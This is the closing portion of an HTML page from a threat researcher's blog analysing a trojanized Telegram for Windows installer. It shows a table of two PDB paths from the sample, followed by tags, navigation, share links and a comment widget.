+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>PDB Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>D:\source\MyJob\反射dll\ConsoleApplication2\obj\Release\反射.pdb</td>
+</tr>
+<tr>
+<td>D:\source\MyJob\企业远程控制\Release\ServerDll.pdb</td>
+</tr>
+</tbody></table>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/Malware/" rel="tag">Malware</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/Telegram/" rel="tag">Telegram</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/Trojan/" rel="tag">Trojan</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/gh0st-RAT/" rel="tag">gh0st RAT</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
+                    data-tooltip="追蹤看門狗集團：Telegram 捆綁木馬程式的多種型態分析"
+                    aria-label="PREVIOUS: 追蹤看門狗集團：Telegram 捆綁木馬程式的多種型態分析"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Research/Deploy-A-Distributed-T-Pot-System-For-Personal-Research-In-Budget-Part-2/"
+                    data-tooltip="Deploy A Distributed T-Pot System For Personal Research In Budget - Part 2"
+                    aria-label="NEXT: Deploy A Distributed T-Pot System For Personal Research In Budget - Part 2"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+                <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2025 Theo Chen. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
+                    data-tooltip="追蹤看門狗集團：Telegram 捆綁木馬程式的多種型態分析"
+                    aria-label="PREVIOUS: 追蹤看門狗集團：Telegram 捆綁木馬程式的多種型態分析"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Research/Deploy-A-Distributed-T-Pot-System-For-Personal-Research-In-Budget-Part-2/"
+                    data-tooltip="Deploy A Distributed T-Pot System For Personal Research In Budget - Part 2"
+                    aria-label="NEXT: Deploy A Distributed T-Pot System For Personal Research In Budget - Part 2"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="2">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">Theo Chen</h4>
+        
+            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>Threat Researcher</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Taipei, Taiwan
+            </div>
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-ntjm1xxqdwr7uhkrlwal4hkgsjrprt8jr4d5cauo3fpjpjoa3nude4bnfikw.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+    
+        <script>
+          var disqus_config = function() {
+            this.page.url = 'https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/';
+              
+            this.page.identifier = 'Research/分析一個加料的-Telegram-for-Windows-中文版安裝程式/';
+              
+          };
+          (function() {
+            var d = document, s = d.createElement('script');
+            var disqus_shortname = 'theo-5';
+            s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+          })();
+        </script>
+    
+
+
+
+
+    </body>
+</html>
